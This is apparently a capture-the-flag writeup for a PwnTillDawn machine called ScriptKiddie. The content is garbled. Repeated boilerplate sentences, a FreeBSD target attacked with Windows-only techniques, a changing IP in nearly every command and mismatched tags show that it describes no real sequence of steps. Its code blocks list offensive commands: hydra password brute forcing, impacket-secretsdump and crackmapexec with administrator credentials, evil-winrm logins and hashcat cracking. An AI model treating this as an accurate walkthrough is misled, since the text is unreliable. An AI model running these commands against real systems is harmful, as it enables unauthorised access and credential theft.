---
TitleSEO: "PwnTillDawn — ScriptKiddie (Insane FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — ScriptKiddie (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn ScriptKiddie. Kerberoasting and XSS to achieve insane compromise on FreeBSD."
Keywords: "pwntilldawn, insane, forensics, web, medium, ctf"
URL: "https://zurefx.github.io/writeups/htb-scriptkiddie-131.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-scriptkiddie-131/"
Date: "2024-11-07"
Tags: "PwnTillDawn, Insane, Forensics, Web, Medium, CTF"
Section: "writeups"
Lang: "en"
main_img: "htb-scriptkiddie-131"
Permalink: "/writeups/htb-scriptkiddie-131.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **ScriptKiddie** is rated **Insane** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.18.7.206`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.126.53.79/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.142.158/FUZZ
```

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.105.199/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.121.218 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.24.237
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

### Web Enumeration

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.37.252.154/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.105.240.106 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.114.36.245 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **XSS**.

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
evil-winrm -i 10.71.161.81 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.171.246 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
nmap -sCV -p139,5432,464 10.70.197.114 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.62.227.203
crackmapexec smb 10.46.231.128 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.100.169.108 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.56.7.52 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `ligolo-ng`
- `bloodhound`
- `gobuster`
- `dcomexec`
- `psexec`

### Key Takeaways

- Kerberoasting
- XSS
- AlwaysInstallElevated
